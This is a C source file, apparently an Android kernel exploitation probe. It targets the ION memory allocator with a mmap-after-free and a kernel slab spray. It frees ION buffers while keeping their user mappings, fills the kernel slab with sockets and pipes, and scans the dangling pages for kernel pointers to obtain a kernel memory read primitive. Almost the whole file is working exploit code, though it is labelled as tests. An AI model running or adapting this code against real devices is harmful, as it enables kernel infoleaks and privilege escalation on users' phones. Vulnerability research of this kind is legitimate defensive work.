/*
 * ion_spray.c — ION system heap mmap-after-free + kernel slab spray
 *
 * ION system heap uses buddy allocator pages (not CMA like KGSL).
 * If we can do mmap-after-free on ION pages, freed pages may get
 * recycled into kernel slab, giving us a kernel memory read primitive.
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o ion_spray ion_spray.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>

/* ION ioctls */
#define ION_IOC_MAGIC 'I'

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;  /* output */
};

struct ion_fd_data {
    int handle;
    int fd;  /* output */
};

struct ion_handle_data {
    int handle;
};

#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOW(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP     _IOWR(ION_IOC_MAGIC, 2, struct ion_fd_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)

/* ION heap IDs - system heap is typically bit 25 */
#define ION_SYSTEM_HEAP_ID  25
#define ION_CP_MM_HEAP_ID   8

static sigjmp_buf jmp_env;
static volatile int fault_caught = 0;
static void fault_handler(int sig) { fault_caught = 1; siglongjmp(jmp_env, 1); }

/* Test 1: ION system heap allocation and mmap */
static void test_ion_basic(void) {
    printf("\n=== Test 1: ION Basic Alloc + mmap ===\n");
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { perror("open /dev/ion"); return; }

    /* Try different heap masks */
    unsigned int heaps[] = {
        (1U << ION_SYSTEM_HEAP_ID),   /* system heap */
        (1U << 0),                     /* heap ID 0 */
        (1U << 1),                     /* heap ID 1 */
        0x1,                           /* first heap */
    };

    for (int h = 0; h < 4; h++) {
        struct ion_allocation_data alloc = {0};
        alloc.len = 4096;
        alloc.align = 4096;
        alloc.heap_id_mask = heaps[h];
        alloc.flags = 0;

        int ret = ioctl(ion_fd, ION_IOC_ALLOC, &alloc);
        if (ret == 0) {
            printf("  heap_mask=0x%x: handle=%d\n", heaps[h], alloc.handle);

            /* Get shareable fd */
            struct ion_fd_data share = { .handle = alloc.handle };
            ret = ioctl(ion_fd, ION_IOC_SHARE, &share);
            if (ret == 0) {
                printf("  share fd=%d\n", share.fd);

                /* mmap it */
                void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_SHARED, share.fd, 0);
                if (ptr != MAP_FAILED) {
                    printf("  mmap OK at %p\n", ptr);
                    memset(ptr, 0x41, 4096);
                    printf("  write OK\n");
                    munmap(ptr, 4096);
                } else {
                    printf("  mmap: %s\n", strerror(errno));
                }
                close(share.fd);
            } else {
                printf("  share: %s\n", strerror(errno));
                /* Try MAP instead */
                struct ion_fd_data map = { .handle = alloc.handle };
                ret = ioctl(ion_fd, ION_IOC_MAP, &map);
                if (ret == 0) {
                    printf("  map fd=%d\n", map.fd);
                    void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                    MAP_SHARED, map.fd, 0);
                    if (ptr != MAP_FAILED) {
                        printf("  mmap OK at %p\n", ptr);
                        munmap(ptr, 4096);
                    }
                    close(map.fd);
                } else {
                    printf("  map: %s\n", strerror(errno));
                }
            }

            /* Free the handle */
            struct ion_handle_data free_data = { .handle = alloc.handle };
            ioctl(ion_fd, ION_IOC_FREE, &free_data);
        } else {
            printf("  heap_mask=0x%x: %s\n", heaps[h], strerror(errno));
        }
    }

    close(ion_fd);
}

/* Test 2: ION mmap-after-free - the key test */
static void test_ion_mmap_uaf(void) {
    printf("\n=== Test 2: ION mmap-after-free ===\n");
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { perror("open /dev/ion"); return; }

    /* Allocate from system heap */
    struct ion_allocation_data alloc = {0};
    alloc.len = 4096;
    alloc.align = 4096;
    alloc.heap_id_mask = (1U << ION_SYSTEM_HEAP_ID);
    alloc.flags = 0;

    int ret = ioctl(ion_fd, ION_IOC_ALLOC, &alloc);
    if (ret < 0) {
        /* Try other heap IDs */
        for (int id = 0; id < 32; id++) {
            alloc.heap_id_mask = (1U << id);
            ret = ioctl(ion_fd, ION_IOC_ALLOC, &alloc);
            if (ret == 0) {
                printf("  Alloc succeeded with heap_id=%d\n", id);
                break;
            }
        }
        if (ret < 0) { printf("  No accessible heap\n"); close(ion_fd); return; }
    }

    /* Get shareable fd */
    struct ion_fd_data share = { .handle = alloc.handle };
    ret = ioctl(ion_fd, ION_IOC_SHARE, &share);
    if (ret < 0) {
        struct ion_fd_data map_d = { .handle = alloc.handle };
        ret = ioctl(ion_fd, ION_IOC_MAP, &map_d);
        if (ret < 0) { printf("  share/map failed\n"); close(ion_fd); return; }
        share.fd = map_d.fd;
    }

    /* mmap the buffer */
    void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                     MAP_SHARED, share.fd, 0);
    if (ptr == MAP_FAILED) { printf("  mmap: %s\n", strerror(errno)); close(share.fd); close(ion_fd); return; }

    /* Write marker pattern */
    uint64_t *data = (uint64_t *)ptr;
    for (int i = 0; i < 512; i++) data[i] = 0xDEAD000000000000ULL | i;
    printf("  Markers written to ION page\n");

    /* Free the ION handle */
    struct ion_handle_data free_data = { .handle = alloc.handle };
    ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("  Handle freed\n");

    /* Close the share fd - this should release the buffer */
    close(share.fd);
    printf("  Share fd closed\n");

    /* Set up fault handler */
    struct sigaction sa, old_sa, old_bus;
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &old_sa);
    sigaction(SIGBUS, &sa, &old_bus);
    fault_caught = 0;

    /* Try to read through the dangling mmap */
    if (sigsetjmp(jmp_env, 1) == 0) {
        volatile uint64_t val = data[0];
        printf("  Read after free: 0x%016lx\n", (uint64_t)val);

        if (val == 0xDEAD000000000000ULL) {
            printf("  >>> DANGLING MMAP PERSISTS! Pages not reclaimed. <<<\n");
        } else if (val == 0) {
            printf("  Pages zeroed — reclaimed but cleared\n");
        } else {
            printf("  >>> DATA CHANGED! Pages reused — potential kernel data! <<<\n");
            /* Scan for kernel pointers */
            int kptrs = 0;
            for (int i = 0; i < 512; i++) {
                volatile uint64_t v = data[i];
                if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL) {
                    printf("  [%d] kernel ptr: 0x%016lx\n", i, (uint64_t)v);
                    kptrs++;
                    if (kptrs > 16) break;
                }
            }
        }
    } else {
        printf("  FAULT — mapping invalidated (pages fully reclaimed)\n");
    }

    sigaction(SIGSEGV, &old_sa, NULL);
    sigaction(SIGBUS, &old_bus, NULL);
    munmap(ptr, 4096);
    close(ion_fd);
}

/* Test 3: ION mmap-after-free with kernel slab spray */
static void test_ion_slab_spray(void) {
    printf("\n=== Test 3: ION UAF + Kernel Slab Spray ===\n");
    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { perror("open /dev/ion"); return; }

    /* Allocate multiple ION pages */
    #define N_ION 32
    void *ptrs[N_ION] = {0};
    int share_fds[N_ION];
    int handles[N_ION];
    int n_ok = 0;

    for (int i = 0; i < N_ION; i++) {
        struct ion_allocation_data alloc = {0};
        alloc.len = 4096;
        alloc.align = 4096;
        alloc.heap_id_mask = (1U << ION_SYSTEM_HEAP_ID);

        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) continue;
        handles[n_ok] = alloc.handle;

        struct ion_fd_data share = { .handle = alloc.handle };
        if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
            struct ion_fd_data map_d = { .handle = alloc.handle };
            if (ioctl(ion_fd, ION_IOC_MAP, &map_d) < 0) continue;
            share.fd = map_d.fd;
        }
        share_fds[n_ok] = share.fd;

        ptrs[n_ok] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_SHARED, share.fd, 0);
        if (ptrs[n_ok] == MAP_FAILED) { ptrs[n_ok] = NULL; close(share.fd); continue; }

        /* Write unique markers */
        uint64_t *d = (uint64_t *)ptrs[n_ok];
        for (int j = 0; j < 512; j++) d[j] = 0xBEEF000000000000ULL | (i << 16) | j;
        n_ok++;
    }
    printf("  Allocated %d ION pages\n", n_ok);

    if (n_ok < 4) { printf("  Not enough pages, aborting\n"); close(ion_fd); return; }

    /* Free half of them (keep mmaps) */
    for (int i = 0; i < n_ok / 2; i++) {
        struct ion_handle_data free_data = { .handle = handles[i] };
        ioctl(ion_fd, ION_IOC_FREE, &free_data);
        close(share_fds[i]);
    }
    printf("  Freed %d ION pages\n", n_ok / 2);

    /* Spray kernel objects: TCP sockets to fill slab */
    printf("  Spraying TCP sockets...\n");
    int socks[500];
    int n_socks = 0;
    for (int i = 0; i < 500; i++) {
        socks[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (socks[i] >= 0) n_socks++;
    }
    printf("  Created %d TCP sockets\n", n_socks);

    /* Also spray pipes */
    int pipes[200][2];
    int n_pipes = 0;
    for (int i = 0; i < 200; i++) {
        if (pipe(pipes[i]) == 0) {
            /* Write data to fill pipe buffers */
            write(pipes[i][1], "AAAA", 4);
            n_pipes++;
        }
    }
    printf("  Created %d pipes\n", n_pipes);

    /* Also spray sendmsg with ancillary data */
    int msg_socks[50];
    int n_msg = 0;
    for (int i = 0; i < 50; i++) {
        msg_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (msg_socks[i] >= 0) n_msg++;
    }
    printf("  Created %d UDP sockets\n", n_msg);

    /* Check freed ION pages for kernel data */
    struct sigaction sa, old_sa, old_bus;
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &old_sa);
    sigaction(SIGBUS, &sa, &old_bus);

    printf("\n  Scanning freed ION pages for kernel data:\n");
    int pages_with_kernel_data = 0;

    for (int i = 0; i < n_ok / 2; i++) {
        if (!ptrs[i]) continue;
        fault_caught = 0;

        if (sigsetjmp(jmp_env, 1) == 0) {
            uint64_t *d = (uint64_t *)ptrs[i];
            volatile uint64_t first = d[0];
            int changed = 0, kptrs = 0;

            for (int j = 0; j < 512; j++) {
                volatile uint64_t v = d[j];
                uint64_t expected = 0xBEEF000000000000ULL | (i << 16) | j;
                if (v != expected) changed++;
                if ((v & 0xFFFFFF0000000000ULL) == 0xffffffc000000000ULL ||
                    (v & 0xFFFFFF0000000000ULL) == 0xffffffbc00000000ULL) {
                    kptrs++;
                }
            }

            if (changed > 0 || kptrs > 0) {
                printf("  Page %d: %d changed, %d kernel ptrs\n", i, changed, kptrs);
                pages_with_kernel_data++;
                /* Print first few interesting values */
                for (int j = 0; j < 64; j++) {
                    volatile uint64_t v = d[j];
                    uint64_t expected = 0xBEEF000000000000ULL | (i << 16) | j;
                    if (v != expected) {
                        printf("    [%d] 0x%016lx\n", j, (uint64_t)v);
                        if (j > 10) break;
                    }
                }
            }
        } else {
            printf("  Page %d: FAULT\n", i);
        }
    }

    printf("\n  Pages with kernel data: %d / %d\n", pages_with_kernel_data, n_ok / 2);

    sigaction(SIGSEGV, &old_sa, NULL);
    sigaction(SIGBUS, &old_bus, NULL);

    /* Cleanup */
    for (int i = 0; i < n_socks; i++) if (socks[i] >= 0) close(socks[i]);
    for (int i = 0; i < n_pipes; i++) { close(pipes[i][0]); close(pipes[i][1]); }
    for (int i = 0; i < n_msg; i++) if (msg_socks[i] >= 0) close(msg_socks[i]);
    for (int i = 0; i < n_ok; i++) if (ptrs[i]) munmap(ptrs[i], 4096);
    for (int i = n_ok / 2; i < n_ok; i++) {
        struct ion_handle_data fd = { .handle = handles[i] };
        ioctl(ion_fd, ION_IOC_FREE, &fd);
        close(share_fds[i]);
    }
    close(ion_fd);
}

int main(void) {
    printf("=== ION System Heap Spray Test ===\n");
    printf("PID: %d  UID: %d\n", getpid(), getuid());

    test_ion_basic();
    test_ion_mmap_uaf();
    test_ion_slab_spray();

    printf("\n=== Done ===\n");
    return 0;
}
